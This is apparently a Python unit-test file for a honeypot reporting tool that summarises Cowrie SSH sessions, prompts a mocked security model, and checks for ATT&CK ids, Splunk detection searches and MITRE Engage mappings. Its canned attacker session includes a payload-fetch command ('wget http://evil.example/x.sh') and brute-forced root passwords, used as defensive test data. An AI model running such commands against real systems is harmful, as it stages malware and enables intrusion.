"""Unit tests for the P12 Foundation-Sec-8B engagement reporter.

The Ollama HTTP call is **mocked** — we never hit the real (slow, CPU) model in
unit tests. We feed a canned session + a canned model response and assert:

  * the session is pulled and compacted (commands/logins/eventids surfaced);
  * the prompt fed to the model includes the session's commands;
  * ATT&CK-id and SPL extraction work on the model output;
  * the assembled report is markdown with the stable header;
  * the deliverable contract is enforced when the model omits structure
    (>=1 ATT&CK id and >=1 SPL snippet are guaranteed).
"""

from __future__ import annotations

import json

import pytest

from chimera import reporter
from chimera.config import Settings


# ---------------------------------------------------------------------------
# Canned data
# ---------------------------------------------------------------------------
SESSION = "abc123session"
SRC_IP = "203.0.113.7"


def _ev(eventid: str, **fields) -> dict:
    raw = {"eventid": eventid, "session": SESSION, "src_ip": SRC_IP}
    raw.update(fields)
    return {"_raw": json.dumps(raw), "src_ip": SRC_IP, "_time": fields.get("_time", 1_000_000.0)}


def _canned_session() -> list[dict]:
    return [
        _ev("cowrie.session.connect", _time=1_000_000.0),
        _ev("cowrie.login.failed", username="root", password="123456", _time=1_000_001.0),
        _ev("cowrie.login.success", username="root", password="admin", _time=1_000_002.0),
        _ev("cowrie.command.input", input="uname -a", _time=1_000_003.0),
        _ev("cowrie.command.input", input="wget http://evil.example/x.sh", _time=1_000_004.0),
        _ev("cowrie.session.closed", _time=1_000_010.0),
    ]


CANNED_MODEL_RESPONSE = """## Observed TTPs
- SSH brute force followed by valid-account login
- Reconnaissance via `uname -a`
- Payload staging via `wget`

## MITRE ATT&CK Technique IDs
- T1110.001 (Password Guessing)
- T1078 (Valid Accounts)
- T1059.004 (Unix Shell)
- T1105 (Ingress Tool Transfer)

## IoCs
- src_ip 203.0.113.7
- URL http://evil.example/x.sh

## Summary
An attacker brute-forced SSH, logged in as root, ran recon and fetched a payload.

## Recommended Detection Rule (SPL)
```spl
index=idx_honeypot sourcetype=cowrie:json eventid="cowrie.command.input" input="wget*"
| stats count by src_ip session
```
"""


def _fake_settings() -> Settings:
    return Settings(
        splunk_mcp_endpoint="https://localhost:8089/services/mcp",
        splunk_mcp_token="x",
    )  # type: ignore[call-arg]


class _FakeClient:
    """Stand-in MCP client returning the canned session for any query."""

    def __init__(self, rows: list[dict]) -> None:
        self.rows = rows
        self.queries: list[str] = []

    async def run_query(self, spl: str) -> list[dict]:
        self.queries.append(spl)
        return self.rows


# ---------------------------------------------------------------------------
# Pure-function tests
# ---------------------------------------------------------------------------
def test_summarize_session_surfaces_commands_and_logins() -> None:
    summary = reporter.summarize_session(_canned_session())
    assert summary["src_ips"] == [SRC_IP]
    assert summary["sessions"] == [SESSION]
    assert "uname -a" in summary["commands"]
    assert any("wget" in c for c in summary["commands"])
    assert any("success" in l for l in summary["logins"])
    assert summary["eventid_counts"]["cowrie.command.input"] == 2
    assert summary["duration_s"] == pytest.approx(10.0)


def test_build_prompt_includes_commands() -> None:
    summary = reporter.summarize_session(_canned_session())
    prompt = reporter.build_prompt(summary)
    assert "uname -a" in prompt
    assert "wget http://evil.example/x.sh" in prompt
    assert SESSION in prompt


def test_extract_attack_ids() -> None:
    ids = reporter.extract_attack_ids(CANNED_MODEL_RESPONSE)
    assert "T1110.001" in ids
    assert "T1078" in ids
    assert "T1059.004" in ids
    # de-duplicated
    assert len(ids) == len(set(ids))


def test_has_spl_snippet() -> None:
    assert reporter.has_spl_snippet(CANNED_MODEL_RESPONSE)
    assert reporter.has_spl_snippet("| stats count by src_ip")
    assert not reporter.has_spl_snippet("just some prose with no search")


def test_extract_spl_from_fence() -> None:
    spl = reporter.extract_spl(CANNED_MODEL_RESPONSE)
    assert spl is not None
    # Inner body only — no ``` fences, includes the search.
    assert "```" not in spl
    assert spl.startswith("index=idx_honeypot")
    assert "| stats count by src_ip session" in spl


def test_extract_spl_from_unfenced_lines_only() -> None:
    # Model wrote the SPL inline (no fence) inside a larger report. We must get
    # ONLY the search lines, not the surrounding prose / headings / session ids.
    report = (
        "# Report session `e927bce9db27`\n\n"
        "## Recommended Detection Rule in Splunk SPL\n"
        "index=main sourcetype=\"cowrie:session\" eventid=\"cowrie.login.success\"\n"
        "| stats count by src_ip session\n"
        "Some trailing prose that is not SPL.\n"
    )
    spl = reporter.extract_spl(report)
    assert spl is not None
    assert spl.startswith("index=main")
    assert "| stats count by src_ip session" in spl
    # Crucially, the bare session id / prose are NOT in the extracted search.
    assert "e927bce9db27" not in spl
    assert "trailing prose" not in spl


def test_extract_spl_returns_none_when_absent() -> None:
    assert reporter.extract_spl("just prose, no searches at all here") is None


def test_assemble_report_passthrough_when_model_complies() -> None:
    summary = reporter.summarize_session(_canned_session())
    report = reporter.assemble_report(
        CANNED_MODEL_RESPONSE, summary, session=SESSION, src_ip=None
    )
    assert report.startswith("# Adversary Engagement Report")
    assert SESSION in report
    # model already provided ids + SPL, so no "(derived)" fallback sections
    assert "(derived)" not in report
    assert "T1078" in report
    assert "```spl" in report


def test_assemble_report_enforces_contract_when_model_omits() -> None:
    summary = reporter.summarize_session(_canned_session())
    bare = "The attacker did some things. No structure here."
    report = reporter.assemble_report(bare, summary, session=SESSION, src_ip=None)
    # fallbacks kicked in
    assert reporter.extract_attack_ids(report)  # at least one ATT&CK id
    assert reporter.has_spl_snippet(report)  # at least one SPL snippet
    assert "(derived)" in report


# ---------------------------------------------------------------------------
# End-to-end with a mocked Ollama call + fake MCP client
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_generate_engagement_report_mocked(monkeypatch) -> None:
    captured: dict = {}

    async def fake_call(prompt, *, settings, **kw):
        captured["prompt"] = prompt
        captured["settings"] = settings
        return CANNED_MODEL_RESPONSE

    monkeypatch.setattr(reporter, "call_foundation_sec", fake_call)

    client = _FakeClient(_canned_session())
    report = await reporter.generate_engagement_report(
        SESSION, settings=_fake_settings(), client=client
    )

    # prompt included the session's commands (assembled from the canned events)
    assert "uname -a" in captured["prompt"]
    assert "wget http://evil.example/x.sh" in captured["prompt"]

    # report assembled, markdown, with model content + ATT&CK + SPL
    assert report.startswith("# Adversary Engagement Report")
    assert reporter.extract_attack_ids(report)
    assert reporter.has_spl_snippet(report)
    assert "T1078" in report

    # a query was actually issued against the (fake) MCP client
    assert client.queries


@pytest.mark.asyncio
async def test_generate_engagement_report_src_ip_selector(monkeypatch) -> None:
    async def fake_call(prompt, *, settings, **kw):
        return CANNED_MODEL_RESPONSE

    monkeypatch.setattr(reporter, "call_foundation_sec", fake_call)

    client = _FakeClient(_canned_session())
    report = await reporter.generate_engagement_report(
        None, src_ip=SRC_IP, settings=_fake_settings(), client=client
    )
    assert report.startswith("# Adversary Engagement Report")
    # the src_ip selector produces a src_ip-scoped query
    assert any(SRC_IP in q for q in client.queries)


@pytest.mark.asyncio
async def test_generate_engagement_report_requires_selector() -> None:
    with pytest.raises(ValueError):
        await reporter.generate_engagement_report(None)


@pytest.mark.asyncio
async def test_generate_engagement_report_no_events(monkeypatch) -> None:
    client = _FakeClient([])  # no events come back
    with pytest.raises(RuntimeError):
        await reporter.generate_engagement_report(
            SESSION, settings=_fake_settings(), client=client
        )


# ---------------------------------------------------------------------------
# P16: MITRE Engage technique mapping
# ---------------------------------------------------------------------------
import re as _re

_ENGAGE_ID_RE = _re.compile(r"\b[ES]AC\d{4}\b")


def _dec_event(etype: str, **fields) -> dict:
    """An idx_deception decision event (route / deception_action) row."""
    raw = {"type": etype, "src_ip": SRC_IP, "session": SESSION}
    raw.update(fields)
    return {"_raw": json.dumps(raw), "src_ip": SRC_IP, "_time": 1_000_005.0}


def test_engage_mapping_table_has_real_ids() -> None:
    # Every technique in the mapping has a real Engage-format id (EAC####),
    # a name, an approach, and a rationale.
    assert reporter.ENGAGE_MAPPING  # non-empty
    for key, techs in reporter.ENGAGE_MAPPING.items():
        assert techs, f"no techniques mapped for {key}"
        for t in techs:
            assert _ENGAGE_ID_RE.fullmatch(t.id), f"{key}: bad id {t.id!r}"
            assert t.name
            assert t.approach
            assert t.rationale
    # Spot-check the verified canonical IDs/names from engage.mitre.org.
    all_techs = [t for techs in reporter.ENGAGE_MAPPING.values() for t in techs]
    by_id = {t.id: t.name for t in all_techs}
    assert by_id["EAC0005"] == "Lures"
    assert by_id["EAC0016"] == "Network Manipulation"
    assert by_id["EAC0006"] == "Application Diversity"
    assert by_id["EAC0014"] == "Software Manipulation"


def test_engage_techniques_lures_baseline() -> None:
    # A plain honeypot engagement (no routing/breadcrumbs) still maps to Lures.
    facts = reporter.DeceptionFacts(lures_active=True)
    techs = reporter.engage_techniques_for(facts)
    ids = {t.id for t in techs}
    assert "EAC0005" in ids  # Lures always present
    assert "EAC0016" not in ids  # no routing -> no Network Manipulation


def test_engage_techniques_full_session() -> None:
    # Routing + aggressive breadcrumbs + MCP decoy + lures.
    facts = reporter.DeceptionFacts(
        lures_active=True,
        routed=True,
        route_honeypot="cowrie",
        mcp_decoy=True,
        breadcrumb_action="aggressive",
    )
    techs = reporter.engage_techniques_for(facts)
    ids = {t.id for t in techs}
    assert {"EAC0005", "EAC0016", "EAC0006"} <= ids
    assert "EAC0021" in ids  # Attack Vector Migration (routing secondary)
    # de-dup: EAC0014 (Software Manipulation) reached via both mcp_decoy and
    # adapt_breadcrumbs must appear once per approach at most.
    keys = [f"{t.id}|{t.approach}" for t in techs]
    assert len(keys) == len(set(keys))


def test_breadcrumbs_adapted_gate() -> None:
    assert not reporter.DeceptionFacts(breadcrumb_action="none").breadcrumbs_adapted
    assert not reporter.DeceptionFacts(breadcrumb_action=None).breadcrumbs_adapted
    assert reporter.DeceptionFacts(breadcrumb_action="subtle").breadcrumbs_adapted
    assert reporter.DeceptionFacts(breadcrumb_action="aggressive").breadcrumbs_adapted


def test_deception_facts_from_events_picks_strongest_action() -> None:
    summary = reporter.summarize_session(_canned_session())
    events = [
        _dec_event("route", honeypot="cowrie", port=2222),
        _dec_event("deception_action", action="moderate"),
        _dec_event("deception_action", action="aggressive"),
        _dec_event("deception_action", action="subtle"),
    ]
    facts = reporter.deception_facts_from_events(summary, events)
    assert facts.routed is True
    assert facts.route_honeypot == "cowrie"
    assert facts.breadcrumb_action == "aggressive"  # strongest wins
    assert facts.breadcrumbs_adapted is True


def test_render_engage_section_contains_real_ids() -> None:
    facts = reporter.DeceptionFacts(
        lures_active=True, routed=True, breadcrumb_action="aggressive"
    )
    section = reporter.render_engage_section(facts)
    assert section.startswith("## MITRE Engage Techniques")
    assert _ENGAGE_ID_RE.search(section)
    assert "EAC0005 Lures" in section
    assert "EAC0016 Network Manipulation" in section


def test_assemble_report_always_has_engage_section() -> None:
    # Even with a fully model-compliant body and no explicit facts, the Engage
    # section is appended (Lures baseline).
    summary = reporter.summarize_session(_canned_session())
    report = reporter.assemble_report(
        CANNED_MODEL_RESPONSE, summary, session=SESSION, src_ip=None
    )
    assert "## MITRE Engage Techniques" in report
    assert "EAC0005 Lures" in report


def test_assemble_report_engage_from_full_facts() -> None:
    summary = reporter.summarize_session(_canned_session())
    facts = reporter.DeceptionFacts(
        lures_active=True, routed=True, breadcrumb_action="aggressive"
    )
    report = reporter.assemble_report(
        CANNED_MODEL_RESPONSE,
        summary,
        session=SESSION,
        src_ip=None,
        deception_facts=facts,
    )
    assert "## MITRE Engage Techniques" in report
    ids = set(_ENGAGE_ID_RE.findall(report))
    assert "EAC0005" in ids
    assert "EAC0016" in ids
    assert "EAC0006" in ids


@pytest.mark.asyncio
async def test_generate_report_includes_engage_section_with_routing(
    monkeypatch,
) -> None:
    # End-to-end (mocked model): a session with routing + aggressive breadcrumbs
    # + lures yields a report containing the Engage section with real IDs.
    async def fake_call(prompt, *, settings, **kw):
        return CANNED_MODEL_RESPONSE

    monkeypatch.setattr(reporter, "call_foundation_sec", fake_call)

    honeypot_rows = _canned_session()
    deception_rows = [
        _dec_event("route", honeypot="cowrie", port=2222),
        _dec_event("deception_action", action="aggressive"),
    ]

    class _TwoIndexClient:
        def __init__(self) -> None:
            self.queries: list[str] = []

        async def run_query(self, spl: str) -> list[dict]:
            self.queries.append(spl)
            if "idx_deception" in spl:
                return deception_rows
            return honeypot_rows

    client = _TwoIndexClient()
    report = await reporter.generate_engagement_report(
        SESSION, settings=_fake_settings(), client=client
    )
    assert "## MITRE Engage Techniques" in report
    ids = set(_ENGAGE_ID_RE.findall(report))
    assert "EAC0005" in ids  # Lures
    assert "EAC0016" in ids  # Network Manipulation (routing)
    assert "EAC0006" in ids  # Application Diversity (aggressive breadcrumbs)
    assert "EAC0005 Lures" in report  # technique name present
    # the deception index was actually queried
    assert any("idx_deception" in q for q in client.queries)


@pytest.mark.asyncio
async def test_generate_report_engage_survives_deception_query_failure(
    monkeypatch,
) -> None:
    # If the idx_deception pull fails (e.g. index absent), the report still
    # renders with the Lures baseline rather than blowing up.
    async def fake_call(prompt, *, settings, **kw):
        return CANNED_MODEL_RESPONSE

    monkeypatch.setattr(reporter, "call_foundation_sec", fake_call)

    honeypot_rows = _canned_session()

    class _FlakyClient:
        async def run_query(self, spl: str) -> list[dict]:
            if "idx_deception" in spl:
                raise RuntimeError("no such index")
            return honeypot_rows

    report = await reporter.generate_engagement_report(
        SESSION, settings=_fake_settings(), client=_FlakyClient()
    )
    assert "## MITRE Engage Techniques" in report
    assert "EAC0005 Lures" in report
